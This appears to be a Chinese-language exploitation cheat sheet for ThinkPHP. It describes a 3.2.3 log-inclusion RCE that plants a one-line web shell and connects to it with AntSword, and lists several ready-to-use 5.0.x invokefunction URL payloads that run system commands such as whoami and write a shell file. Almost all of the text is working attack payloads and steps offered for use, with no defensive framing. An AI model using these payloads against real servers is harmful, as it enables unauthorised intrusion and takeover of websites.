# TinkPHP3.2.3 RCE漏洞利用
- 通过报错判断出框架版本

![image](https://user-images.githubusercontent.com/71583369/154673738-59bda70b-f2e5-4027-96fa-6b9ffe6586fa.png)

- 抓取数据包插入代码使其报错

![image](https://user-images.githubusercontent.com/71583369/154674368-e4991795-61a1-493b-a7f0-cbf4c05dd1af.png)

- 日志存放路径Application/Runtime/Logs/Common，报错信息会存放到日志中。
- 构造payload

```
后面的日期根据实际情况进行修改
http://x.x.x.x/index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/21_07_14.log
```
- 随后我们写入的代码会被执行

![image](https://user-images.githubusercontent.com/71583369/154675181-0800ca89-82ea-408c-a83e-b80dc2c5cfe3.png)

- 对报错内容进行修改成一句话

![image](https://user-images.githubusercontent.com/71583369/154675381-3fa470fd-91f2-43e2-a2de-915bb4bd44d4.png)

- 使用蚁剑进行连接getshell。

- 参考连接https://0xcreed.jxustctf.top/2021/07/ThinkPHP3-2-x-RCE%E5%A4%8D%E7%8E%B0/

# tinkphp5.0.*漏洞利用
payload
```
http://192.168.2.134/tp5/public/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
```
```
/thinkphp/public/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=dir
```
```
/thinkphp/public/?s=index/\think\app/invokefunction&function=phpinfo&vars[0]=1
```
```
/thinkphp/public/?s=index/\think\app/invokefunction&function=system&vars=dir
```
```
/thinkphp/public/?s=index/\think\app/invokefunction&function=system&return_value=&command=dir
```
```
/thinkphp/public/?s=index/\think\app/invokefunction&function=system&vars[0]=dir&vars[1][]=
```
```
/thinkphp/public/index.php?s=index/\think\template\driver\file/write&cacheFile=shell
```
# 参考连接https://forum.90sec.com/t/topic/704
